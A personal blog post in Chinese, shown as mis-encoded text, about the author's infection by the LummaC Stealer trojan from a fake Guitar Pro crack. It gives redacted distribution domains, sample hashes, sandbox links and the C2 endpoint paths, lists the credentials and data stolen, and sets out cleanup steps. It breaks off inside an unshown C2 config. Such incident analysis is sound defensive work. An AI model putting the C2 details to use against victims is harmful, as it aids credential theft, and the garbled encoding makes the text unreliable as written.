2023-11-07</p>\n<p>é‚®ç®±è¢«æ”¹ç»‘</p>\n<p>è¿½å›ï¼šæ‰¾å®¢æœæ’•é€¼</p>\n<p>äº‹å®ä¸Šï¼Œåœ¨é‚®ç®±é‡Œèƒ½æ‰¾åˆ°â€œå·²åˆ é™¤â€çš„é‚®ä»¶ï¼š</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/1.png\" alt=\"ä¸€åˆ†é’Ÿå†…å®ŒæˆéªŒè¯æ”¹ç»‘ä¸åˆ é™¤é‚®ä»¶\" loading=\"lazy\"></p>\n<p>ä¸€åˆ†é’Ÿå†…å®ŒæˆéªŒè¯æ”¹ç»‘ä¸åˆ é™¤é‚®ä»¶</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/2.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/3.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<h2 id=\"è¯±å› -åŸºæœ¬æƒ…å†µ\"><a href=\"#è¯±å› -åŸºæœ¬æƒ…å†µ\" class=\"headerlink\" title=\"è¯±å› &amp;åŸºæœ¬æƒ…å†µ\"></a>è¯±å› &amp;åŸºæœ¬æƒ…å†µ</h2><p>ç—…æ¯’æ–‡ä»¶æ¥æºï¼š</p>\n<p><a href=\"https://[REDACTED].com/guitar-pro-crack/\">https:&#x2F;&#x2F;[REDACTED].click&#x2F;cgi-sys&#x2F;defaultwebpage.cgi</a></p>\n<p>â†’https:&#x2F;&#x2F;[REDACTED].click&#x2F;?i&#x3D;Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download&amp;u&#x3D;1699615197&amp;t&#x3D;17</p>\n<p>â†’https:&#x2F;&#x2F;[REDACTED].cfd&#x2F;</p>\n<p>â†’Passwd.2024.Setap.rar</p>\n<blockquote>\n<p>ğŸ’¡ 2023-11-11 Update: æ–‡ä»¶è¢«æ›´æ–°<br>â†’<a href=\"https://href.li/?https://%5BREDACTED%5D.cfd/?h=rfbnUPMSF5l2DcQuKxs0C7YH61W3ipvtZ&amp;s=17&amp;f=Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download\">https://href.li/?https://[REDACTED].cfd/?h=rfbnUPMSF5l2DcQuKxs0C7YH61W3ipvtZ&amp;s=17&amp;f=Guitar-Pro-8-3-3-Crack-With-License-Key-2023-Free-Download</a></p>\n</blockquote>\n<h2 id=\"çº¿ç´¢åˆ†æï¼šLummaC2-V4-0\"><a href=\"#çº¿ç´¢åˆ†æï¼šLummaC2-V4-0\" class=\"headerlink\" title=\"çº¿ç´¢åˆ†æï¼šLummaC2 V4.0 ?\"></a>çº¿ç´¢åˆ†æï¼šLummaC2 V4.0 ?</h2><h3 id=\"ç—…æ¯’æ ·æœ¬åˆ†æç»“æœ\"><a href=\"#ç—…æ¯’æ ·æœ¬åˆ†æç»“æœ\" class=\"headerlink\" title=\"ç—…æ¯’æ ·æœ¬åˆ†æç»“æœ\"></a>ç—…æ¯’æ ·æœ¬åˆ†æç»“æœ</h3><p><a href=\"https://www.virustotal.com/gui/file/6ea22a21e9815986454f3b9c3dbdea9df158aad847b0620263e7524ea0cef5ba/behavior\">https://www.virustotal.com/gui/file/6ea22a21e9815986454f3b9c3dbdea9df158aad847b0620263e7524ea0cef5ba/behavior</a></p>\n<p><a href=\"https://www.virustotal.com/gui/file/8735ce3942864b8031fe311bdb1e77ece23e9f6794953a038484cee3e185bc09/behavior\">https://www.virustotal.com/gui/file/8735ce3942864b8031fe311bdb1e77ece23e9f6794953a038484cee3e185bc09/behavior</a></p>\n<p><a href=\"https://www.joesandbox.com/analysis/1293164/0/html\">https://www.joesandbox.com/analysis/1293164/0/html</a></p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/4.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p><strong>è¢«åˆ é™¤çš„é‚®ä»¶æ—¶é—´åœ¨1minå†…ï¼Œä¸”æ²¡æœ‰ç”¨çš„é‚®ä»¶å¤„äºæœªè¯»çŠ¶æ€ï¼šæç¤ºè§„æ¨¡åŒ–çš„è‡ªåŠ¨åŒ–åˆ©ç”¨</strong></p>\n<p><strong>LummaC Stealeræ ·æœ¬</strong></p>\n<p>æœ¨é©¬æœ¬ä½“ç¼–å†™ï¼šä¿„ç½—æ–¯ï¼ˆMaaSï¼‰</p>\n<p>æœ¨é©¬å¤–åŒ…è£…ï¼šä¸­å›½ï¼ˆæ•°å­—ç­¾åï¼‰</p>\n<p>æœ¨é©¬ä½¿ç”¨è€…ï¼šä¹Œå…‹å…°-æ–‡å°¼å¯ŸOblast</p>\n<p>æœ¨é©¬çš„C2ç½‘ç«™æ³¨å†Œäºï¼š2023-10-11</p>\n<p>æœ¨é©¬ä¸‹è½½äºï¼š2023-1015</p>\n<p>æ ·æœ¬é¦–æ¬¡è¢«åˆ†æï¼š2023-10-14</p>\n<p>å‘ä½œæ—¥æœŸï¼šè‡³å°‘2023-11-4ä»¥å‰</p>\n<p><a href=\"https://twitter.com/anyrun_app/status/1698643550567579991\">https://twitter.com/anyrun_app/status/1698643550567579991</a></p>\n<p>è¿™ç¯‡æ¨æ–‡æŒ‡å‡ºåœ¨å…¶C2æœåŠ¡å™¨çš„<code>/c2conf</code> å¯ä»¥æŸ¥çœ‹å…¶é…ç½®ã€‚<strong>æ³¨æ„ï¼šè¯¥æœ¨é©¬å¯ä»¥æ‰§è¡Œæºå¸¦çš„payload! ä¾‹å¦‚EXE, PowerShell</strong></p>\n<p><strong>æˆ‘æ³¨æ„åˆ°æœ¬æœºPowerShellçš„å®‰å…¨ç­‰çº§è¢«è®¾ç½®ä¸ºâ€Unrestrictedâ€, å¹¶ä¸æ˜¯é»˜è®¤çš„ç­‰çº§å±é™©!!!</strong></p>\n<p>æ­¤å¤–æœ¨é©¬ä¼¼ä¹è¿˜è¯·æ±‚äº†å¦ä¸€æ¶æ„è½¯ä»¶(ä¼ªè£…æˆ<code>clip.exe</code>)ï¼š<a href=\"https://bazaar.abuse.ch/sample/fe3f04adc1fb9922ee259a9f355a79bb8cfac741d3490b4372cb80fe287877b1/\">https://bazaar.abuse.ch/sample/fe3f04adc1fb9922ee259a9f355a79bb8cfac741d3490b4372cb80fe287877b1/</a></p>\n<p><a href=\"https://app.any.run/tasks/c1bd75b1-c7fd-4d57-86cd-77161313a399/\">https://app.any.run/tasks/c1bd75b1-c7fd-4d57-86cd-77161313a399/</a></p>\n<p>æç¤º<strong>RaccoonStealerï¼Œ ä½†ä¹Ÿæœ‰å¯èƒ½æ˜¯Amadeyï¼š</strong></p>\n<p><a href=\"https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/\">https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/</a></p>\n<p>æˆ‘æ€€ç–‘è¿™ä¸ªè¢«æ£€æµ‹å‡ºè™šæ‹Ÿç¯å¢ƒäº†ç›´æ¥crashäº†ã€‚</p>\n<p>ç›¸æ¯”ä¹‹ä¸‹æ˜¯æ¯”è¾ƒç²—ç³™çš„ä¸€ä¸ªã€‚</p>\n<p>æœ¬äº‹ä»¶ä¸­æ²¡æœ‰æ‰§è¡Œæ¶æ„æŒ‡ä»¤ä¼¼ä¹ï¼Œä¹Ÿè®¸æ˜¯C2æ²¡æœ‰ä¸‹å‘å‘½ä»¤ã€‚AnyRunè¿™ä¸ªåœ¨10-25æ‰æœ‰çš„è®°å½•</p>\n<p>æ²¡æœ‰ç½‘ç»œè¿æ¥ï¼Œä½†æ˜¯è®¾ç½®è®¡åˆ’ä»»åŠ¡ä»¥å®ç°æŒä¹…åŒ–(è¿œç¨‹æ§åˆ¶ï¼Ÿ)ã€‚</p>\n<h3 id=\"å¯¹LummaC-Stealerå·²æœ‰çš„åˆ†æ\"><a href=\"#å¯¹LummaC-Stealerå·²æœ‰çš„åˆ†æ\" class=\"headerlink\" title=\"å¯¹LummaC Stealerå·²æœ‰çš„åˆ†æ\"></a>å¯¹LummaC Stealerå·²æœ‰çš„åˆ†æ</h3><p><a href=\"https://www.esentire.com/blog/the-case-of-lummac2-v4-0\">https://www.esentire.com/blog/the-case-of-lummac2-v4-0</a> ï¼ˆæœ€è´´åˆçš„ï¼‰</p>\n<p><a href=\"https://ja.darktrace.com/blog/the-rise-of-the-lumma-info-stealer\">https://ja.darktrace.com/blog/the-rise-of-the-lumma-info-stealer</a></p>\n<p><a href=\"https://blogs.vmware.com/security/2023/10/an-ilummanation-on-lummastealer.html\">https://blogs.vmware.com/security/2023/10/an-ilummanation-on-lummastealer.html</a></p>\n<p><a href=\"https://twitter.com/anyrun_app/status/1698643550567579991\">https://twitter.com/anyrun_app/status/1698643550567579991</a></p>\n<p><a href=\"https://asec.ahnlab.com/en/50594/\">https://asec.ahnlab.com/en/50594/</a> (è¿˜çœŸæ˜¯ä¸»è¦é è™šå‡çš„ç ´è§£è½¯ä»¶ä¼ æ’­)</p>\n<h3 id=\"åˆ©ç”¨è„šæœ¬åˆ†æ\"><a href=\"#åˆ©ç”¨è„šæœ¬åˆ†æ\" class=\"headerlink\" title=\"åˆ©ç”¨è„šæœ¬åˆ†æ\"></a>åˆ©ç”¨è„šæœ¬åˆ†æ</h3><p><a href=\"https://github.com/esThreatIntelligence/RussianPanda_tools/blob/main/lummac2_config_extractor_build.py\">https://github.com/esThreatIntelligence/RussianPanda_tools/blob/main/lummac2_config_extractor_build.py</a></p>\n<p><a href=\"https://github.com/esThreatIntelligence/RussianPanda/blob/main/lummac2_fetch_config_from_C2.py\">https://github.com/esThreatIntelligence/RussianPanda/blob/main/lummac2_fetch_config_from_C2.py</a></p>\n<p>æ²¡æœ‰æ‰¾åˆ°ã€‚è¿™å¯èƒ½è¯å®å…¶ä½¿ç”¨C2æœåŠ¡å™¨ä¸‹å‘é…ç½®è€Œéåƒè€ç‰ˆæœ¬åµŒå…¥ã€‚</p>\n<p>ä½†æ˜¯åœ¨Finsinçš„ç½‘ç«™ä¸­æ‰¾åˆ°äº†ç±»ä¼¼çš„URLï¼Œ</p>\n<p>åŒ…å«</p>\n<p><a href=\"http://[REDACTED].fun/\">http:&#x2F;&#x2F;[REDACTED].fun</a></p>\n<p><a href=\"http://[REDACTED].pw/\">http:&#x2F;&#x2F;[REDACTED].pw</a></p>\n<p>ç­‰ã€‚</p>\n<p>è¿™äº›Hostä¼¼ä¹å‡ºè‡ªåŒä¸€ä¸»ä½“ã€‚å¥½æ¶ˆæ¯ï¼š<strong>åªè¦æ‰¾åˆ°å…¶ä¸­ä¸€ä¸ªæ­£åœ¨å·¥ä½œçš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬è‡³å°‘å¯ä»¥çŸ¥é“å¯¹æ–¹åšäº†ä»€ä¹ˆï¼</strong></p>\n<p>æˆ‘ä»¬å°è¯•å‘åŒ…ï¼š</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/5.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/6.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/7.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/8.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/9.png\" alt=\"Untitled\" loading=\"lazy\"></p>\n<p>æœ¬æ¬¡çš„æ ·æœ¬å¯¹åº”C2æœåŠ¡å™¨: [REDACTED].fun</p>\n<p><code>/api</code> <code>/c2conf</code> <code>/c2sock</code></p>\n<h3 id=\"æ²™ç›’åˆ†æ\"><a href=\"#æ²™ç›’åˆ†æ\" class=\"headerlink\" title=\"æ²™ç›’åˆ†æ\"></a>æ²™ç›’åˆ†æ</h3><p><a href=\"https://app.any.run/tasks/e66e2b32-73ae-4962-95e2-98c143fba6e4\">https://app.any.run/tasks/e66e2b32-73ae-4962-95e2-98c143fba6e4</a></p>\n<p>æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚å› ä¸ºC&amp;C Server Downäº†</p>\n<p>C2é…ç½®ï¼šï¼ˆè§æ–‡æœ«ï¼‰</p>\n<p>å¯ä»¥çœ‹å‡ºç›®æ ‡æœ‰ï¼š</p>\n<ul>\n<li>ç”¨æˆ·ç›®å½•ä¸‹çš„txtæ–‡ä»¶</li>\n<li>ç”¨æˆ·ç›®å½•ä¸‹æ–‡ä»¶åå«æœ‰<code>key</code> çš„æ–‡ä»¶</li>\n<li>ç”¨æˆ·ç›®å½•ä¸‹å¯èƒ½æ˜¯åŠ å¯†è´§å¸æ•æ„Ÿä¿¡æ¯çš„ç›¸å…³æ–‡ä»¶</li>\n<li>æµè§ˆå™¨ä¸­åŠ å¯†è´§å¸çš„æ’ä»¶<strong>ï¼ˆç¡®è®¤æ³„éœ²ï¼‰</strong></li>\n<li><strong>ä¸¤æ­¥éªŒè¯è½¯ä»¶æ•°æ®</strong></li>\n<li>æµè§ˆå™¨æ•°æ®ã€<strong>è‡ªåŠ¨å¡«å……å’Œå¯†ç ç®¡ç†å™¨ä¸­çš„æ•°æ®ï¼ˆç¡®è®¤æ³„éœ²ï¼‰</strong></li>\n<li>æµè§ˆå™¨<strong>æ‰€æœ‰å†å²è®°å½•ï¼ˆç¡®è®¤æ³„éœ²ï¼‰</strong></li>\n<li><strong>Steamè´¦æˆ·æ•æ„Ÿæ•°æ®ï¼ˆç¡®è®¤æ³„éœ²ï¼‰</strong></li>\n<li><strong>Telegramè´¦å·æ•æ„Ÿæ•°æ®ï¼ˆç¡®è®¤æ³„éœ²ï¼‰</strong></li>\n<li>ç¯å¢ƒä¿¡æ¯ï¼šè¿›ç¨‹ã€ç³»ç»Ÿã€ç¡¬ä»¶ã€å·²å®‰è£…è½¯ä»¶<strong>ï¼ˆç¡®è®¤æ³„éœ²ï¼‰</strong></li>\n</ul>\n<p>äº‹å®ä¸Šè¿˜å¯èƒ½åŒ…æ‹¬ï¼š</p>\n<ul>\n<li>æ–‡æ¡£ç›®å½•ä¸­çš„å›¾ç‰‡</li>\n<li>æ³¨å…¥æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹å®ç°å¯æŒä¹…åŒ–</li>\n</ul>\n<p>ä½†å°±è¿™æ¬¡æ¥çœ‹ï¼Œæ”»å‡»è€…é€‰æ‹©æä¸€æ³¢å°±ç»“æŸã€‚</p>\n<p>çªƒå–çš„ä¿¡æ¯ä»¥<code>.zip</code> æ ¼å¼ä¸Šä¼ ï¼Œå†…å®¹ç¤ºä¾‹ï¼š</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/10.png\" alt=\"å®‰è£…çš„è½¯ä»¶\" loading=\"lazy\"></p>\n<p>å®‰è£…çš„è½¯ä»¶</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/11.png\" alt=\"è¿›ç¨‹ï¼Œæœ€åä¸¤ä¸ªå³ä¸ºç—…æ¯’\" loading=\"lazy\"></p>\n<p>è¿›ç¨‹ï¼Œæœ€åä¸¤ä¸ªå³ä¸ºç—…æ¯’</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/12.png\" alt=\"ç³»ç»Ÿä¿¡æ¯ä¸Lummaæ ‡è¯†ç¬¦\" loading=\"lazy\"></p>\n<p>ç³»ç»Ÿä¿¡æ¯ä¸Lummaæ ‡è¯†ç¬¦</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/13.png\" alt=\"æµè§ˆå™¨æ•æ„Ÿä¿¡æ¯\" loading=\"lazy\"></p>\n<p>æµè§ˆå™¨æ•æ„Ÿä¿¡æ¯</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/14.png\" alt=\"å¯†ç ï¼Œè‡ªåŠ¨å¡«å……ä¿¡æ¯ï¼Œå†å²è®°å½•ï¼Œç½‘é¡µæ•°æ®ï¼ŒCookie\" loading=\"lazy\"></p>\n<p>å¯†ç ï¼Œè‡ªåŠ¨å¡«å……ä¿¡æ¯ï¼Œå†å²è®°å½•ï¼Œç½‘é¡µæ•°æ®ï¼ŒCookie</p>\n<p><img src=\"/2023/11/22/%E5%AF%B9%E6%9C%A8%E9%A9%ACLummaC-Stealer%E6%A0%B7%E6%9C%AC%E6%9E%81%E7%AE%80%E7%9A%84%E4%B8%80%E6%AC%A1%E5%88%86%E6%9E%90/15.png\" alt=\"æµè§ˆå™¨æ—¥å¿—\" loading=\"lazy\"></p>\n<p>æµè§ˆå™¨æ—¥å¿—</p>\n<p>æ¨è®ºï¼šè¯¥æœ¨é©¬æ¤å…¥åé—¨åï¼Œè¿›è¡Œè§„æ¨¡åŒ–çš„è‡ªåŠ¨åŒ–åˆ©ç”¨ï¼Œä¸”ä¸»è¦ç”¨äºè·å–ç›´æ¥ç»æµåˆ©ç›Šã€‚</p>\n<p>æ¯”è¾ƒé—æ†¾çš„ä¸€ç‚¹æ˜¯å½“æ—¶æ²¡åŠæ—¶æŸ¥çœ‹c2confå…·ä½“çš„é…ç½®ï¼Œä¸æ¸…æ¥šå…·ä½“çš„ç›®æ ‡ã€‚ä¹Ÿæ²¡æƒ³å»any.runä¸Šè·‘ä¸€ä¸‹çœ‹çœ‹ã€‚</p>\n<p>å…¶å®è¯¥é…ç½®æ–‡ä»¶å¼€å¤´æ˜¯<strong>32-byteçš„XORå¯†é’¥ï¼ŒCyberChefå°±èƒ½ç§’æ‰</strong></p>\n<p>æœç´¢è¯¥C2æœåŠ¡å™¨ï¼Œåœ¨ä¸€ä¸ªå®‰å…¨ç ”ç©¶ç»„ç»‡çš„ç½‘ç«™ä¸Šæ‰¾åˆ°äº†å”¯ä¸€çš„ç»“æœï¼š</p>\n<p><a href=\"https://ioc.finsin.cl/Output_FINSIN_URL\">https://ioc.finsin.cl/Output_FINSIN_URL</a></p>\n<p>æœç´¢<code>/c2conf</code> <code>/api</code>å¯ä»¥çœ‹åˆ°å¹¶éå­¤ä¾‹ï¼Œæ³¨å†Œè€…å‡ç±»ä¼¼ï¼Œæ€€ç–‘å‡ºè‡ªåŒä¸€ä¸»ä½“ã€‚</p>\n<p>ä½†æ˜¯ï¼Œæœ¬æ¬¡æ ·æœ¬æ˜¯<code>/api</code> ï¼Œ<del>ä¸æ¸…æ¥šä¸ºä½•</del>(æ›´æ¢äº†æ–°çš„Endpoint)ã€‚</p>\n<p><a href=\"https://twitter.com/g0njxa/status/1702444978503360989\">https://twitter.com/g0njxa/status/1702444978503360989</a></p>\n<p>è€ƒè™‘åˆ°è¿™æ˜¯MaaSä¸”æ”»å‡»è€…è¡¨ç°å‡ºäº†å¾ˆä½çš„ä¸“ä¸šæ€§ï¼ˆæœªæ¸…ç©ºå·²åˆ é™¤é‚®ä»¶ï¼‰ï¼Œæœ‰ç†ç”±æ€€ç–‘ä½¿ç”¨çš„æ˜¯æœ¨é©¬å‘å¸ƒè€…çš„é¢„è®¾ã€‚</p>\n<h2 id=\"æªæ–½\"><a href=\"#æªæ–½\" class=\"headerlink\" title=\"æªæ–½\"></a>æªæ–½</h2><p>é‡ç½®å¯†ç ç®¡ç†å™¨ä¸­çš„<strong>æ‰€æœ‰</strong>å¯†ç ï¼ˆæœ‰æ•ˆçš„çº¦30ä¸ªï¼‰</p>\n<p>ç½‘ç»œè´¦å·ç™»å‡ºå…¶ä»–è®¾å¤‡</p>\n<p>åºŸå¼ƒæ‰€æœ‰ç§é’¥ï¼ˆ3ä¸ªï¼‰</p>\n<p>æ›´æ”¹é‚®ç®±å¯†ç </p>\n<p>Steamä¸¤æ­¥éªŒè¯ï¼ˆè¿™æ¬¡åªæœ‰å®ƒå—ä¼¤ï¼Œå› ä¸ºåªæœ‰Valveç‰¹ç«‹ç‹¬è¡Œæä¸ªè‡ªå·±çš„ä¸¤æ­¥éªŒè¯ç„¶åéªŒè¯ç æ”¶ä¸åˆ°ï¼‰</p>\n<p>ç¦ç”¨PowerShellæ‰§è¡Œï¼Œç ´åPowerShellç”¨äºåˆ©ç”¨çš„åº“</p>\n<p>æ£€æŸ¥æ³¨å†Œè¡¨ä¸è®¡åˆ’ä»»åŠ¡ç›¸å…³é¡¹ï¼ˆå°¤å…¶æ˜¯åœ¨æ²™ç›’ä¸­æœ‰å¯ç–‘ä¿®æ”¹è¿¹è±¡çš„å¯¹è±¡ã€Entryï¼‰</p>\n<p>ç¦æ­¢IoCä¸­çš„åŸŸåã€IPç­‰</p>\n<p>æ¸…é™¤æµè§ˆå™¨ç¼“å­˜ä¸Cookie</p>\n<p>åˆ é™¤<code>%TEMP%</code>ç›®å½•ä¸‹çš„æ‰€æœ‰.exe</p>\n<p>åˆ é™¤<code>%USERPROFILE%</code> <code>%APPDATA%</code> <code>%LOCALAPPDATA%</code>å¯¹åº”çš„åœ¨æ²™ç®±ä¸­è¢«è¯»å†™çš„æ–‡ä»¶</p>\n<p>â€œå¿«å»å«360è€å°†æ¥ï¼â€</p>\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>å¯¹ç½‘ç»œå®‰å…¨å¿ƒå­˜æ•¬ç•ï¼æ³¨æ„ä¿æŠ¤å¥½è‡ªå·±çš„ç¡¬ä»¶</p>\n<blockquote>\n<p>Punch line: ä¸­å›½ç»„ç»‡ç”¨ä¿„ç½—æ–¯çš„æœ¨é©¬åŒ…è£…äº†ä¸€ä¸ªé’“é±¼å®‰è£…åŒ…å–ç»™ä¹Œå…‹å…°äººåœ¨å†°å²›ç½‘ç«™ä¸Šé’“é±¼å¹¶ä¸”åœ¨é¶æœºä¸Šæ”¾äº†ä¸ªåé—¨ä¸ç¾å›½æœåŠ¡å™¨è”é€š</p>\n</blockquote>\n<p>è¿™æ¬¡éå¸¸ä¾¥å¹¸ï¼ç”µè„‘å¨±ä¹ç”¨ï¼Œä¸å’Œå¹²æ´»æœºå­æ··ç”¨æ‰€ä»¥æ²¡æœ‰æ•æ„Ÿä¿¡æ¯ï¼›å…¶ä¸Šæ²¡æœ‰ä¸¤æ­¥éªŒè¯è½¯ä»¶æˆ–è€…è™šæ‹Ÿè´§å¸é’±åŒ…ï¼›ç»å¤§éƒ¨åˆ†çš„åæ¸—é€ä¹Ÿè¢«ä¸¤æ­¥éªŒè¯æ‹¦ä¸‹äº†ã€‚</p>\n<p>è‡³å°‘ç›®å‰çœ‹æ¥ï¼ŒC2æœåŠ¡å™¨è¢«Cloudflareæ‹¿ä¸‹ï¼Œä¹Ÿç¡®å®Downäº†ã€‚æ²™ç›’é‡Œæ²¡æœ‰å±•ç°å…¶ä»–çš„C2æœåŠ¡å™¨è¿æ¥ã€‚é™¤éå®‰ç½®äº†åˆ«çš„åé—¨ï¼Œå¦åˆ™åº”è¯¥æ˜¯å®‰å…¨çš„ã€‚</p>\n<p>ä¿¡æ¯æ³„éœ²æ˜¯ä¸å¯é€†çš„ï¼Œæƒ¨ç—›æ•™è®­+1</p>\n<p>å‡ ä¹ä¸€è‡´çš„æ ·æœ¬ï¼ˆè¿å‹ç¼©åŒ…éƒ½æ˜¯ä¸€ä¸ªåå­—ï¼‰ï¼š<a href=\"https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/#\">https://app.any.run/tasks/8d233d7c-bdc5-4feb-b02b-a5fa1e32f1cf/#</a></p>\n<ul>\n<li>ä¸è¿‡è¿™ä¸ªä¼¼ä¹è¢«æœ¨é©¬è®¤å‡ºæ¥åœ¨è™šæ‹Ÿç¯å¢ƒé‡Œï¼Œè‡ªå·±crashæ‰äº†ã€‚</li>\n</ul>\n<p>å®Œå…¨å»åˆçš„åˆ†æï¼š<a href=\"https://www.esentire.com/blog/the-case-of-lummac2-v4-0\">https://www.esentire.com/blog/the-case-of-lummac2-v4-0</a></p>\n<p>æŠ€æœ¯åˆ†æï¼š<a href=\"https://www.intrinsec.com/wp-content/uploads/2023/10/TLP-CLEAR-Lumma-Stealer-EN-Information-report.pdf\">https://www.intrinsec.com/wp-content/uploads/2023/10/TLP-CLEAR-Lumma-Stealer-EN-Information-report.pdf</a></p>\n<p>å·²ç»å¯ä»¥è¯´å®é”¤äº†ã€‚</p>\n<p>é¡ºå¸¦ä¸€æAny.RunçœŸæ˜¯å¥½ä¸œè¥¿ï¼Œå­¦æ ¡é‚®ç®±å¯ä»¥æ³¨å†Œã€‚</p>\n<ul>\n<li><p>ç–‘ä¼¼åŒä¸€æ”»å‡»è€…çš„C2 é…ç½®ï¼Œçœ‹å¾—å‡ºæ¥å®Œå…¨å°±æ˜¯é¢„è®¾</p>\n  <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span 